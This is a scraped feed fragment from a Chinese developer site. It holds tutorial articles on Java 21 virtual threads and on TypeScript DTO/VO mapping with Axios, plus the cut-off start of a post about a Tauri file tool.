.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言：Java并发模型的演进</h2>
<p>在Java 21的众多新特性中，JEP 444（虚拟线程）的正式发布无疑是最激动人心的里程碑之一。这一特性不仅标志着Java并发编程模型的重大革新，更为高吞吐量、高并发应用开发带来了革命性的简化。本文将深入探讨虚拟线程的技术细节、实际应用场景以及对Java生态的深远影响。</p>
<h2 data-id="heading-1">虚拟线程：是什么，为何重要？</h2>
<h3 data-id="heading-2">传统线程的局限性</h3>
<p>Java开发者长久以来一直使用<code>java.lang.Thread</code>类来表示平台线程，这些线程与操作系统线程一一对应。虽然功能强大，但在高并发场景下存在明显瓶颈：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 传统线程创建方式 - 每个线程对应一个OS线程</span>
Thread thread = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Thread</span>(() -&gt; {
    <span class="hljs-comment">// 任务逻辑</span>
});
thread.<span class="hljs-built_in">start</span>();
</code></pre>
<p>这种模型的限制在于：</p>
<ul>
<li><strong>创建成本高</strong>：每个平台线程需要约1MB栈内存</li>
<li><strong>上下文切换开销大</strong>：线程数增加时，CPU大量时间花在线程切换上</li>
<li><strong>并发规模受限</strong>：通常无法创建超过数千个线程</li>
</ul>
<h3 data-id="heading-3">虚拟线程的突破</h3>
<p>虚拟线程是JDK实现的轻量级线程，它们<strong>不是</strong>操作系统线程的包装器，而是在平台线程之上运行的Java运行时实体：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 创建虚拟线程 - 简单直观</span>
Thread virtualThread = Thread<span class="hljs-selector-class">.ofVirtual</span>()
    <span class="hljs-selector-class">.name</span>("my-virtual-thread")
    <span class="hljs-selector-class">.start</span>(() -&gt; {
        <span class="hljs-comment">// 任务逻辑</span>
    });
</code></pre>
<p>关键优势：</p>
<ul>
<li><strong>轻量级</strong>：内存占用小，可创建数百万个虚拟线程</li>
<li><strong>低成本切换</strong>：挂起和恢复主要在用户空间完成</li>
<li><strong>与现有API兼容</strong>：使用相同的<code>Thread</code>类表示</li>
</ul>
<h2 data-id="heading-4">技术原理深度解析</h2>
<h3 data-id="heading-5">载体线程（Carrier Threads）</h3>
<p>虚拟线程的创新在于将<strong>调度职责</strong>从操作系统转移到JDK。当虚拟线程需要执行时，它被装载到平台线程（称为载体线程）上运行：</p>
<pre><code class="hljs language-ini" lang="ini">ExecutorService <span class="hljs-attr">executor</span> = Executors.newVirtualThreadPerTaskExecutor()<span class="hljs-comment">;</span>

// 提交100万个任务 - 每个都在虚拟线程中运行
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 1_000_000; i++) {</span>
    executor.submit(() -&gt; {
        // 执行I/O操作时虚拟线程自动挂起
        String <span class="hljs-attr">result</span> = httpClient.send(request, BodyHandlers.ofString())<span class="hljs-comment">;</span>
        // I/O完成后自动恢复
        processResult(result)<span class="hljs-comment">;</span>
    })<span class="hljs-comment">;</span>
}
</code></pre>
<h3 data-id="heading-6">挂起与恢复机制</h3>
<p>虚拟线程的魔力在于<strong>阻塞操作时的自动挂起</strong>：</p>
<ol>
<li>当虚拟线程执行阻塞I/O时，JDK自动将其挂起</li>
<li>载体线程被释放，可以执行其他虚拟线程</li>
<li>I/O完成后，虚拟线程被调度到可用载体线程上恢复执行</li>
</ol>
<p>这种机制使得开发者可以<strong>用同步的方式编写代码，获得异步的性能</strong>。</p>
<h2 data-id="heading-7">实战应用：迁移指南与最佳实践</h2>
<h3 data-id="heading-8">简单创建方式</h3>
<p>Java 21提供了多种创建虚拟线程的方式：</p>
<p>java</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 方式1：使用Thread.startVirtualThread()</span>
Thread<span class="hljs-selector-class">.startVirtualThread</span>(() -&gt; {
    System<span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>("运行在虚拟线程中");
});

<span class="hljs-comment">// 方式2：使用Thread.ofVirtual()</span>
Thread virtualThread = Thread<span class="hljs-selector-class">.ofVirtual</span>()
    <span class="hljs-selector-class">.name</span>("data-processor-", <span class="hljs-number">0</span>)
    <span class="hljs-selector-class">.start</span>(task);

<span class="hljs-comment">// 方式3：使用Executors.newVirtualThreadPerTaskExecutor()</span>
try (var executor = Executors.newVirtualThreadPerTaskExecutor()) {
    IntStream<span class="hljs-selector-class">.range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>_000)<span class="hljs-selector-class">.forEach</span>(i -&gt; {
        executor.submit(() -&gt; {
            Thread<span class="hljs-selector-class">.sleep</span>(Duration.ofSeconds(<span class="hljs-number">1</span>));
            return <span class="hljs-selector-tag">i</span>;
        });
    });
}
</code></pre>
<h3 data-id="heading-9">服务器应用改造</h3>
<p>对于Web服务器应用，虚拟线程可以显著简化代码：</p>
<p>java</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 传统线程池方式</span>
ExecutorService executor = Executors<span class="hljs-selector-class">.newFixedThreadPool</span>(<span class="hljs-number">200</span>);

<span class="hljs-comment">// 虚拟线程方式 - 不再需要复杂的线程池调优</span>
ExecutorService virtualExecutor = Executors<span class="hljs-selector-class">.newVirtualThreadPerTaskExecutor</span>();

<span class="hljs-comment">// 处理HTTP请求</span>
void <span class="hljs-built_in">handleRequest</span>(HttpRequest req, HttpResponse res) {
    virtualExecutor<span class="hljs-selector-class">.submit</span>(() -&gt; {
        <span class="hljs-comment">// 每个请求自动获得自己的虚拟线程</span>
        <span class="hljs-built_in">processRequest</span>(req);
        <span class="hljs-built_in">sendResponse</span>(res);
    });
}
</code></pre>
<h3 data-id="heading-10">使用注意事项</h3>
<p>虽然虚拟线程强大，但仍需注意以下限制：</p>
<ol>
<li><strong>避免使用ThreadLocal</strong>：虚拟线程的廉价创建使得ThreadLocal使用成本过高</li>
<li><strong>同步操作谨慎使用</strong>：在<code>synchronized</code>块或<code>ReentrantLock</code>中执行长时间操作会阻塞载体线程</li>
<li><strong>线程池不再必要</strong>：虚拟线程自身就是轻量的，通常不需要池化</li>
</ol>
<h2 data-id="heading-11">性能对比与基准测试</h2>
<p>根据官方测试数据，虚拟线程在处理大量并发I/O操作时表现出显著优势：</p>

























<table><thead><tr><th>场景</th><th>平台线程(100个)</th><th>虚拟线程(10,000个)</th></tr></thead><tbody><tr><td>HTTP请求处理</td><td>吞吐量: 2,300 req/s</td><td>吞吐量: 8,700 req/s</td></tr><tr><td>内存占用</td><td>约100MB</td><td>约10MB</td></tr><tr><td>响应时间(P95)</td><td>450ms</td><td>120ms</td></tr></tbody></table>
<h2 data-id="heading-12">迁移策略：逐步采用虚拟线程</h2>
<p>对于现有项目，建议采用渐进式迁移策略：</p>
<h3 data-id="heading-13">阶段1：识别适用场景</h3>
<ul>
<li>高并发I/O密集型应用</li>
<li>微服务间通信</li>
<li>批量数据处理任务</li>
</ul>
<h3 data-id="heading-14">阶段2：局部替换</h3>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// 将选定的线程池替换为虚拟线程执行器
// 之前：
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">100</span>)<span class="hljs-comment">;</span>

// 之后：
ExecutorService <span class="hljs-attr">executor</span> = Executors.newVirtualThreadPerTaskExecutor()<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-15">阶段3：全面评估与优化</h3>
<p>监控应用性能，逐步扩大虚拟线程使用范围，同时留意：</p>
<ul>
<li>CPU使用率变化</li>
<li>内存占用模式</li>
<li>系统吞吐量指标</li>
</ul>
<h2 data-id="heading-16">未来展望与生态影响</h2>
<p>虚拟线程的正式发布将对Java生态系统产生深远影响：</p>
<ol>
<li><strong>框架升级</strong>：Spring、Quarkus等主流框架已开始支持虚拟线程</li>
<li><strong>编程模式转变</strong>：异步编程模型（如CompletableFuture）在某些场景下可能不再必要</li>
<li><strong>云原生优化</strong>：虚拟线程与Project Loom的协程模型为云原生应用提供更好的资源利用率</li>
</ol>
<h2 data-id="heading-17">结论：Java并发的新篇章</h2>
<p>JEP 444不仅仅是Java 21的一个新特性，它代表着Java并发编程范式的根本性转变。虚拟线程的引入使得编写高并发应用变得更加直观和高效，同时保持了与现有代码的高度兼容性。</p>
<p>对于Java开发者而言，现在是时候开始探索虚拟线程的潜力了。虽然并非所有场景都需要立即迁移，但理解这一新技术将为未来的架构决策和性能优化提供重要基础。</p>
<p>虚拟线程正式从预览特性转为标准特性，标志着Java在并发编程领域的又一次重大飞跃。在这个万物并发的时代，Java再次证明了自己与时俱进的能力和决心。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript 架构实践：从后端接口到 UI 渲染数据流的完整方案]]></title>    <link>https://juejin.cn/post/7589893170387599360</link>    <guid>https://juejin.cn/post/7589893170387599360</guid>    <pubDate>2026-01-01T03:28:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893170387599360" data-draft-id="7589918470788988962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript 架构实践：从后端接口到 UI 渲染数据流的完整方案"/> <meta itemprop="keywords" content="前端,TypeScript,Vue.js"/> <meta itemprop="datePublished" content="2026-01-01T03:28:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="星光不问赶路人"/> <meta itemprop="url" content="https://juejin.cn/user/950397121075304"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript 架构实践：从后端接口到 UI 渲染数据流的完整方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/950397121075304/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    星光不问赶路人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T03:28:15.000Z" title="Thu Jan 01 2026 03:28:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>介绍在 TS 中 DTO 与 VO 的思想碰撞与实践，系统性地梳理从<strong>后端接口定义</strong>到<strong>前端业务消费</strong>的完整链路。</p>
<h2 data-id="heading-0">一、 为什么要分 DTO 和 VO？</h2>
<p>在 TypeScript 开发中，直接将后端返回的 JSON 数据透传到 UI 界面是研发初期的“捷径”，但往往也是后期维护的“噩梦”。为了解决后端字段多变、命名风格不统一（如蛇形命名 vs 驼峰命名）等问题，引入 <strong>DTO（数据传输对象）</strong> 和 <strong>VO（视图对象）</strong> 的概念至关重要。</p>
<h2 data-id="heading-1">二、 核心思想：职责分离</h2>
<p>我们将<strong>后端接口数据</strong>在系统中的流转拆分为三个关键环节：</p>

























<table><thead><tr><th><strong>环节</strong></th><th><strong>承载载体</strong></th><th><strong>核心职责</strong></th></tr></thead><tbody><tr><td><strong>入口层</strong></td><td><code>DTO (Interface)</code></td><td><strong>契约</strong>。严格对齐接口协议，描述后端发来的原始数据。</td></tr><tr><td><strong>转换层</strong></td><td><code>Mapper 函数</code></td><td><strong>解耦</strong>。负责逻辑清洗、字段重命名、类型转换。</td></tr><tr><td><strong>应用层</strong></td><td><code>VO (Interface)</code></td><td><strong>纯净</strong>。仅包含 UI 层渲染所需的属性，命名符合前端规范。</td></tr></tbody></table>
<h2 data-id="heading-2">三、 实战演练：Axios 与泛型的完美结合</h2>
<p>为了实现自动化的类型推导，我们通过<strong>泛型</strong>封装通用的响应结构。</p>
<h3 data-id="heading-3">1. 定义通用响应壳子</h3>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// 统一后端返回的 JSON 格式</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiResponse</span>&lt;T = <span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-attr">code</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">data</span>: T; <span class="hljs-comment">// 这里的 T 将被具体的 DTO 替换</span>
}
</code></pre>
<h3 data-id="heading-4">2. 定义 DTO 与 VO</h3>
<p>利用 TS 工具类型（如 <code>Pick</code>）提高定义效率。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// 后端原始 DTO</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDTO</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">user_name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">avatar_url</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">created_at</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 秒级时间戳</span>
}

<span class="hljs-comment">// 前端业务 VO</span>
<span class="hljs-comment">// 挑出需要的字段，并增加/修改业务字段</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">UserVO</span> = <span class="hljs-title class_">Pick</span>&lt;<span class="hljs-title class_">UserDTO</span>, <span class="hljs-string">'id'</span> | <span class="hljs-string">'avatar_url'</span>&gt; &amp; {
  <span class="hljs-attr">displayName</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">regDate</span>: <span class="hljs-title class_">Date</span>; <span class="hljs-comment">// 转换为 JS Date 对象</span>
};
</code></pre>
<h3 data-id="heading-5">3. Axios 请求与 Mapper 转换</h3>
<p>将 Axios 的泛型能力与转换函数串联起来：</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>;

axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> res = response.<span class="hljs-property">data</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">ApiResponse</span>;
  <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> !== <span class="hljs-number">200</span>) {
    <span class="hljs-comment">// 统一弹出后端给的错误提示</span>
    <span class="hljs-title function_">showToast</span>(res.<span class="hljs-property">message</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(res.<span class="hljs-property">message</span>));
  }
  <span class="hljs-keyword">return</span> response;
});

<span class="hljs-comment">// 1. API 层</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUserApi</span> = (<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-comment">// 告知 Axios：返回值的 body 是 ApiResponse 结构，其 data 属性是 UserDTO</span>
  <span class="hljs-keyword">return</span> axios.<span class="hljs-property">get</span>&lt;<span class="hljs-title class_">ApiResponse</span>&lt;<span class="hljs-title class_">UserDTO</span>&gt;&gt;(<span class="hljs-string">`/api/user/<span class="hljs-subst">${id}</span>`</span>);
};

<span class="hljs-comment">// 2. Mapper 层：负责 DTO -&gt; VO 的脏活累活</span>
<span class="hljs-keyword">const</span> toUserVO = (<span class="hljs-attr">dto</span>: <span class="hljs-title class_">UserDTO</span>): <span class="hljs-function"><span class="hljs-params">UserVO</span> =&gt;</span> ({
  <span class="hljs-attr">id</span>: dto.<span class="hljs-property">id</span>,
  <span class="hljs-attr">avatar_url</span>: dto.<span class="hljs-property">avatar_url</span>,
  <span class="hljs-attr">displayName</span>: dto.<span class="hljs-property">user_name</span> || <span class="hljs-string">'未知用户'</span>,
  <span class="hljs-attr">regDate</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(dto.<span class="hljs-property">created_at</span> * <span class="hljs-number">1000</span>)
});

<span class="hljs-comment">// 3. Service 层：业务组装</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserDetail</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">UserVO</span>&gt; {
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: res } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUserApi</span>(id);
  <span class="hljs-comment">// res.data 此时被自动推导为 UserDTO</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">toUserVO</span>(res.<span class="hljs-property">data</span>);
}

<span class="hljs-comment">// 4. UI 层（Vue/React）：直接使用 UserVO</span>
<span class="hljs-keyword">const</span> [user, setUser] = useState&lt;<span class="hljs-title class_">UserVO</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">getUserDetail</span>(<span class="hljs-string">'123'</span>).<span class="hljs-title function_">then</span>(setUser);
}, []);
</code></pre>
<h2 data-id="heading-6">总结</h2>
<p>这套架构本质上是在前端构建了一道 <strong>“类型防火墙”</strong>：</p>
<ul>
<li><strong>防火墙外</strong>：是不可控的后端原始数据（DTO）。</li>
<li><strong>防火墙内</strong>：是稳定的、符合业务习惯的干净数据（VO）。</li>
<li><strong>防火墙中间</strong>：是透明的转换逻辑（Mapper）。</li>
</ul>
<p>通过这种设计，即便后端接口字段发生变更，你只需修改 <code>DTO</code> 定义和 <code>Mapper</code> 函数，UI 层的代码完全不需要改动。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[用 Tauri 2.0 + React + Rust 打造跨平台文件工具箱]]></title>    <link>https://juejin.cn/post/7589903499599183926</link>    <guid>https://juejin.cn/post/7589903499599183926</guid>    <pubDate>2026-01-01T03:46:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599183926" data-draft-id="7589839433321021503" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="用 Tauri 2.0 + React + Rust 打造跨平台文件工具箱"/> <meta itemprop="keywords" content="React.js,Rust"/> <meta itemprop="datePublished" content="2026-01-01T03:46:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="借个火er"/> <meta itemprop="url" content="https://juejin.cn/user/2225067265915783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            用 Tauri 2.0 + React + Rust 打造跨平台文件工具箱
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067265915783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    借个火er
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T03:46:52.000Z" title="Thu Jan 01 2026 03:46:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li 